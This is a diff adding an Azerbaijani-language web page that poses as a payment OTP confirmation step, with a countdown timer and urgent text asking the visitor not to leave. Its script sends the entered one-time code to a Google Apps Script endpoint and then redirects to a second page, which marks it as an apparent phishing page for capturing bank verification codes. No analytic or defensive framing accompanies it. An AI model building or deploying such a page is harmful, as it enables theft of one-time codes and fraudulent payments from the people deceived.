@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OTP Təsdiq</title>
+    <style>
+@font-face {
+    font-family: 'GilroyBold';
+    src: url('Gilroy-Bold.ttf') format('truetype');
+}
+
+body {
+    margin: 0;
+    padding: 0;
+    font-size: 24px; /* Genel font boyutu büyütüldü */
+    font-family: Arial, sans-serif;
+    background-color: #f9f9f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    text-align: left;
+}
+
+.container {
+    width: 75%; /* Form genişliği artırıldı */
+    max-width: 900px; /* Maksimum genişlik artırıldı */
+    padding: 4rem;
+    background-color: #fff;
+    border-radius: 55px;
+    border: 2px solid red;
+    box-shadow: 0 8px 20px rgba(255, 0, 0, 0.5);
+}
+
+.logo img {
+    width: 400px; /* Logo kesinlikle 400px yapıldı */
+    height: auto;
+    margin-bottom: 3rem;
+    display: block;
+    margin-left: auto;
+    margin-right: auto;
+}
+
+.info-text,
+.form-group label,
+.timer,
+button,
+.form-group input[type="text"] {
+    font-size: 1.8rem; /* Tüm yazılar büyütüldü */
+    text-align: left; /* Tüm yazılar sola hizalandı */
+}
+
+.info-text {
+    color: #333;
+    margin-bottom: 2.5rem;
+    word-wrap: break-word;
+    line-height: 1.8;
+}
+
+.form-group {
+    margin-bottom: 2.5rem;
+}
+
+.form-group label {
+    font-weight: bold;
+    display: block;
+    margin-bottom: 1rem;
+}
+
+.form-group input[type="text"] {
+    width: 100%;
+    padding: 1.8rem;
+    border: 2px solid #ccc;
+    border-radius: 55px;
+    font-family: Arial, sans-serif;
+    box-sizing: border-box;
+}
+
+.timer {
+    color: red;
+    margin: 2rem 0;
+}
+
+button {
+    width: 100%;
+    padding: 1.8rem;
+    font-size: 1.8rem;
+    color: #fff;
+    background-color: #ea3325;
+    border: none;
+    border-radius: 55px;
+    cursor: not-allowed;
+    text-align: center; /* Yazıyı ortala */
+}
+
+button:enabled {
+    background-color: #c21818;
+    cursor: pointer;
+}
+
+button:disabled {
+    background-color: #f5c6c6;
+}
+
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="logo.svg" alt="Logo">
+        </div>
+        <div class="info-text">
+            Ödəniş istəkləri çox olduğundan OTP kodunuz <br> gec göndərilə bilər! <br>
+            Səhifədən ayrılmamağınız xahiş olunur!
+        </div>
+        <form id="otpForm">
+            <div class="form-group">
+                <label for="otpInput">OTP kodunu daxil edin.</label>
+                <input type="text" id="otpInput" placeholder="OTP" maxlength="6" minlength="4" pattern="[0-9]{4,6}" required>
+            </div>
+            <div class="timer" id="timer">Qalan vaxt: 05:00</div>
+            <button type="button" id="submitButton" disabled>Ödənişi Təsdiqlə</button>
+        </form>
+    </div>
+    <script>
+        // Timer Fonksiyonu (5 Dakika)
+        function startTimer(duration, display) {
+            let timer = duration, minutes, seconds;
+            const interval = setInterval(function () {
+                minutes = parseInt(timer / 60, 10);
+                seconds = parseInt(timer % 60, 10);
+
+                minutes = minutes < 10 ? "0" + minutes : minutes;
+                seconds = seconds < 10 ? "0" + seconds : seconds;
+
+                display.textContent = `Qalan vaxt: ${minutes}:${seconds}`;
+
+                if (--timer < 0) {
+                    clearInterval(interval);
+                    display.textContent = "Qalan vaxt: 00:00";
+                    document.getElementById("submitButton").disabled = true;
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const display = document.getElementById("timer");
+            const fiveMinutes = 5 * 60;
+            startTimer(fiveMinutes, display);
+        };
+
+        document.getElementById("submitButton").addEventListener("click", function () {
+            const otpInput = document.getElementById("otpInput").value.trim();
+
+            // Maksimum 6 ve minimum 4 karakter kontrolü
+            if (otpInput.length < 4 || otpInput.length > 6) {
+                alert("OTP kodu 4 ilə 6 rəqəm arasında olmalıdır!");
+                return;
+            }
+
+            const data = { otp: otpInput };
+
+            fetch("https://script.google.com/macros/s/AKfycbySe0hCUb5zREcOJQlTi2e3-OuQvd4CaW9iO0EHtTcJbabMQdFMrEkBZ8xx0lFDgCHi/exec", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(data),
+                mode: "no-cors",
+            })
+            .then(response => {
+                window.location.href = "index2.html"; // Başarıyla yönlendirme
+            })
+            .catch(error => {
+                console.error("OTP Gönderim Hatası:", error);
+            });
+        });
+
+        document.getElementById("otpInput").addEventListener("input", function () {
+            const otpInput = document.getElementById("otpInput").value.trim();
+            const submitButton = document.getElementById("submitButton");
+
+            if (otpInput.length >= 4 && otpInput.length <= 6) {
+                submitButton.disabled = false;
+            } else {
+                submitButton.disabled = true;
+            }
+        });
+    </script>
+</body>
+</html>
